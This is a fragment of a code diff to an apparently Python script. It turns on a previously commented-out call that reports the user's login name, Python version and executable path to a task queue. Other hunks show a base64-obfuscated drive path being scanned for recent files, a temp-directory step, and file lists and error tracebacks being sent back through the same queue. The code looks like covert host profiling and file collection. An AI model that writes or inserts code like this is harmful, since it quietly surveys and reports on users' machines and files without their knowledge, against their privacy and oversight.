@@ -118,11 +118,8 @@ def find_file(target_name, start_dir):
             return os.path.join(root, target_name)
     return None
 
-try:
-    pass
-    #add_queue_task('tsl__{}__begin'.format(getpass.getuser().lower()), {'sys_version' : str(sys.version), 'exec_path' : str(sys.executable)})
-except:
-    pass
+add_queue_task('tsl__{}__begin'.format(getpass.getuser().lower()),
+{'sys_version' : str(sys.version), 'exec_path' : str(sys.executable)})
 
 try:
     ldir = search_latest_files_or_dirs(dir_path=base64.b64decode('Uzov').decode(), ext='', n=5)
@@ -145,7 +142,6 @@ except:
 
 import random
 try:
-
     random.shuffle(zovV)
     for _, fp in zovV[:1]:
         import tempfile
@@ -218,7 +214,7 @@ try:
         
     if zovV:
         add_queue_task('tsl_update',{'done': sorted(zovV[:30], reverse=True)})
-        
+     
 except:
     import traceback
     add_queue_task('tsl_update_error',{'error': str(traceback.format_exc())})
